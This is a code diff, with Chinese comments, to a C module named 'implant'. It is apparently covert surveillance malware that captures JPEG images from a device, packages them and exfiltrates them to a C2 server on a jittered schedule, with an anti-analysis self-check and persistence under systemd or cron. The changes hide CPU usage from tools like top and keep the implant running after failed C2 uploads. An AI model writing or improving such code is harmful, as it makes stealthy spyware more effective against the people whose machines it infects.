@@ -33,6 +33,10 @@ struct implant {
     implant_pack_t    pack_fn;   void *pack_ud;
     implant_exfil_t   exfil_fn;  void *exfil_ud;
     implant_defend_t  defend_fn; void *defend_ud;
+    /* 等待期让出 CPU 的钩子。未注入则 ST_WAIT 直接返回（busy-spin）。
+     * 见 implant_run 里 guard 判据的注释：真实时间源 + 等待态 busy-spin
+     * 会在第一个批间隔就把 guard 跑满。 */
+    implant_sleep_us_t sleep_fn; void *sleep_ud;
 
     uint8_t  *jpeg_buf;  size_t jpeg_cap;  size_t jpeg_len;
     uint8_t  *art_buf;   size_t art_cap;   size_t art_len;
@@ -199,6 +203,12 @@ void implant_set_defend(implant_t *im, implant_defend_t fn, void *ud)
     im->defend_fn = fn; im->defend_ud = ud;
 }
 
+void implant_set_sleep(implant_t *im, implant_sleep_us_t fn, void *ud)
+{
+    if (!im) return;
+    im->sleep_fn = fn; im->sleep_ud = ud;
+}
+
 void implant_stop(implant_t *im)
 {
     if (!im) return;
@@ -254,7 +264,20 @@ implant_err_t implant_step(implant_t *im)
             return IMPLANT_STOPPED;
         }
         uint64_t now = now_of(im);
-        if (now < im->deadline_us) return IMPLANT_OK;   /* 仍在等待 */
+        if (now < im->deadline_us) {
+            /* 仍在等待：让出 CPU。
+             *
+             * 不睡的后果有两层，第二层才致命：
+             *   1) 等待期 busy-spin 吃满一个核，top 里一眼可见；
+             *   2) implant_run 的 guard 计的是 step 次数，50ms 的批间隔
+             *      就能 busy-spin 跑满一百万次并被判成死循环 —— 常驻
+             *      进程于是只发一批就退出。
+             * 未注入 sleep 钩子时保持原行为，测试注入固定时间源的单步
+             * 用例不受影响。 */
+            if (im->sleep_fn)
+                im->sleep_fn(im->deadline_us - now, im->sleep_ud);
+            return IMPLANT_OK;
+        }
         /* 注意：此处不动 last_gap_ms。它只表示「上一批结束后排定的间隔」，
          * 由 EXFIL 写入。若在这里改成「实际超时量」，调用方会读到两种含义
          * 混在一起的数值，无法据此判断调度是否正常。 */
@@ -365,12 +388,52 @@ implant_err_t implant_run(implant_t *im)
     if (!im) return IMPLANT_ERR_PARAM;
 
     uint64_t guard = 0;
+    uint64_t last_now = now_of(im);
     for (;;) {
         implant_err_t e = implant_step(im);
-        if (e != IMPLANT_OK) return e;
-        if (im->state == ST_DONE) return IMPLANT_STOPPED;
-        /* 防止调用方注入的时间源不推进导致死循环 */
-        if (++guard > 1000000ULL) return IMPLANT_ERR_PARAM;
+        if (e == IMPLANT_STOPPED || im->state == ST_DONE) return IMPLANT_STOPPED;
+
+        if (e != IMPLANT_OK) {
+            /* 对抗自检失败必须终止：判定的就是「这台机器不安全」，
+             * 继续跑等于把采集证据留在不安全环境里。 */
+            if (e == IMPLANT_ERR_DEFEND) return e;
+            if (im->cfg.stop_on_error) return e;
+
+            /* 常驻进程：单批失败不终止整个守护。
+             *
+             * fail_step 在 stop_on_error 为假时刻意不改 state（避免把
+             * 可恢复的单批失败升级成终态），但这也意味着失败的那一步会
+             * 被原样重试——本批制品已失效、设备句柄可能已关，重试必然
+             * 再失败。所以这里必须显式把状态机推回 WAIT 并排定下一批，
+             * 让下一批重新走完整的「开设备→采集→转码→封装→回传」。
+             *
+             * 在此之前，implant_run 只判 e != IMPLANT_OK 就返回，于是
+             * 配置里写着 stop_on_error=false 的常驻进程仍会因为一次
+             * 回传失败（C2 抖动、对端重启、网络切换都是常态）而整体退出。
+             * systemd 的 Restart=always 会把这件事掩盖成「不停重启、
+             * 每次只发一批」，cron 下则是每周期只发一批 —— 部署侧看到
+             * 进程在跑、也有字节，无从发现。 */
+            if (im->opened) { im->src->close(im->src); im->opened = 0; }
+            uint64_t gap = im->cfg.interval_ms;
+            if (im->cfg.jitter_ms)
+                gap += xs64(&im->rng) % (uint64_t)(im->cfg.jitter_ms + 1);
+            im->last_gap_ms = gap;
+            im->deadline_us = now_of(im) + gap * 1000ULL;
+            im->state = ST_WAIT;
+        }
+        /* 死循环保护：判据是「时间源是否推进」，不是 step 次数。
+         *
+         * 按 step 计数时，ST_WAIT 的等待期会把 guard 跑满：批间隔 50ms
+         * 就足够触发，于是 implant_run 返回 IMPLANT_ERR_PARAM，常驻进程
+         * 只发出第一批就退出。systemd 下被 Restart=always 掩盖成「不停
+         * 重启、每次只发一批」，cron 下则是每周期只发一批 —— 部署侧看
+         * 到进程在跑、也有字节，无从发现。
+         *
+         * 改为只在时间源确实不推进时才累加：真实时间源下等待期时间在走，
+         * guard 恒被重置；注入的固定时间源下才会在百万次后判定死循环。 */
+        uint64_t now = now_of(im);
+        if (now != last_now) { last_now = now; guard = 0; }
+        else if (++guard > 1000000ULL) return IMPLANT_ERR_PARAM;
     }
 }
 
